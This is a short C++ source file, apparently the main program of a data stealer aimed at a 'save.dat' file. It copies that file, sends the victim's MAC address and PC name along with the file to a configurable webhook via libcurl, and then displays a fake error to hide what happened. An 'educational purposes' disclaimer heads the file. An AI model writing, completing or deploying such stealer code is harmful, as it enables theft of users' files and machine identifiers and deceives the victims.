/*
* save.dat stealer with webhook via libcurl
* I'm also not responsible with any damage, this is only for educational purposes.
* do not forget to set webhook_url in send.h
*/



#include <iostream>
#include <string>
#define CURL_STATICLIB
#include "curl/curl.h"
#include <Windows.h>
#include "send.h"
#include "file.h"
#include <fstream>
#pragma comment (lib, "curl/libcurl_a.lib")
#pragma comment (lib, "Crypt32.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "user32.lib")
#pragma comment (lib, "Wldap32.lib")
#pragma comment (lib, "advapi32.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Normaliz.lib")
#pragma comment(linker, "/NODEFAULTLIB:LIBCMT")


int main()
{
	copyfile(); //copying file from save.dat location for bypass read shit
	send_message(); // sending mac, pc name
	send_dat(); // sending save.dat
	send_error(); // fake error
}
